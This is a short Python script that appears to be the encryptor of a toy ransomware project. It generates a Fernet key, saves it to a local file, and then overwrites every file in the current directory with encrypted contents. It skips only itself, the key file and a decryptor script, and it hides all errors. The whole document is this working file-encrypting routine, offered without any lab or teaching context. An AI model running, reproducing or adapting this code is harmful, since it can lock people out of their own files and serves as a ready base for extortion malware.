import os
from cryptography.fernet import Fernet  # pip install cryptography

TOKEN = Fernet.generate_key()

with open("token_file.key", "wb") as token_file:
    token_file.write(TOKEN)

fernet = Fernet(TOKEN)

def encrypt(file):
    try:
        with open(file, "rb") as my_file:
            my_file_data = my_file.read()
        encrypted_file_data = fernet.encrypt(my_file_data)
        with open(file, "wb") as my_file:
            my_file.write((encrypted_file_data))

    except Exception:
        return


safe_file = ['main.py', 'token_file.key', 'decryted.py']

for file in os.listdir():
    if file in safe_file:
        continue
    elif os.path.isfile(file):
        encrypt(file)
